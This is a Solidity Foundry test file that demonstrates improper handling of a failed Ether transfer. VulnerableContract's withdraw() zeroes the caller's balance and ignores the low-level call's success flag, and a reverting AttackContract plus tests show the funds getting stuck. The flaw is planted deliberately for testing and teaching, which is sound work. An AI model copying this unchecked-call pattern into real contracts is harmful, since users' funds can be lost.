pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Assume the vulnerable code is already compiled and available in the testing environment
// The contracts VulnerableContract and AttackContract are declared as in the provided source file.

// VulnerableContract with improper exceptional events handling:
contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");
        // Set balance to 0 before interaction (Checks-Effects-Interactions)
        balances[msg.sender] = 0;
        // Low-level call without checking the success flag
        (bool success, ) = msg.sender.call{value: amount}("");
        // If the call fails, nothing is done
    }

    receive() external payable {}
}

// Attack contract that exploits the vulnerability
contract AttackContract {
    VulnerableContract public vulnerable;

    // Constructor accepts the address of the VulnerableContract
    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Fallback function deliberately reverts; note: added receive for clarity is not needed because fallback is payable
    fallback() external payable {
        revert("Fallback always fails");
    }

    // Attack function deposits and then triggers withdraw in VulnerableContract
    function attack() external payable {
        require(msg.value > 0, "Send ETH");
        vulnerable.deposit{value: msg.value}();
        // The withdraw call will attempt sending ETH to this contract, but the fallback reverts
        vulnerable.withdraw();
    }
}

// Foundry test contract
contract ImproperExceptionalEventsHandlingTest is Test {
    VulnerableContract vulnerable;
    AttackContract attack;

    // Create dummy EOA account for a normal user test
    address user = address(0xBEEF);

    function setUp() public {
        // Deploy the vulnerable contract
        vulnerable = new VulnerableContract();
        // Deploy the attack contract pointing to the vulnerable contract
        attack = new AttackContract(payable(address(vulnerable)));
    }

    // Test that a normal externally owned account (EOA) can deposit and then successfully withdraw funds
    function testNormalWithdrawal() public {
        uint depositAmount = 1 ether;

        // Fund the user account
        vm.deal(user, depositAmount);

        // Acting as the user, deposit funds
        vm.prank(user);
        vulnerable.deposit{value: depositAmount}();

        // Acting as the user, withdraw funds
        vm.prank(user);
        vulnerable.withdraw();

        // After withdrawal, the user (EOA) should have increased balance because it receives ETH directly
        // Note: the exact balance change depends on gas usage so we check that the mapping is cleared and ETH left contract is reduced
        uint userMappingBalance = vulnerable.balances(user);
        assertEq(userMappingBalance, 0, "User balance in contract should be zero after withdrawal");

        // Additionally, the vulnerable contract's ETH balance should drop (approximately by depositAmount)
        uint vulnerableEthBalance = address(vulnerable).balance;
        // Due to gas nuances, we check that the vulnerable contract balance is less than depositAmount
        assertLt(vulnerableEthBalance, depositAmount);
    }

    // Test that the attack contract exploits the vulnerability by causing the withdrawal ETH transfer to fail
    function testAttack() public {
        uint depositAmount = 1 ether;

        // Fund the test contract (acting as the attacker externally)
        vm.deal(address(this), depositAmount);
        
        // Call attack contract's attack() function with depositAmount
        attack.attack{value: depositAmount}();

        // Check that in the VulnerableContract, the balance mapping for the attack contract is cleared
        uint attackMappingBalance = vulnerable.balances(address(attack));
        assertEq(attackMappingBalance, 0, "Attack contract's balance in mapping should be zero after withdrawal");

        // Since the withdraw() call did not correctly handle the failing transfer, the ETH remains in the VulnerableContract
        uint vulnerableEthBalance = address(vulnerable).balance;
        assertEq(vulnerableEthBalance, depositAmount, "Vulnerable contract should still hold the deposited ETH due to failed transfer");

        // And the attack contract should not have received any ETH
        uint attackEthBalance = address(attack).balance;
        assertEq(attackEthBalance, 0, "Attack contract balance should be zero because fallback always reverts");
    }
}
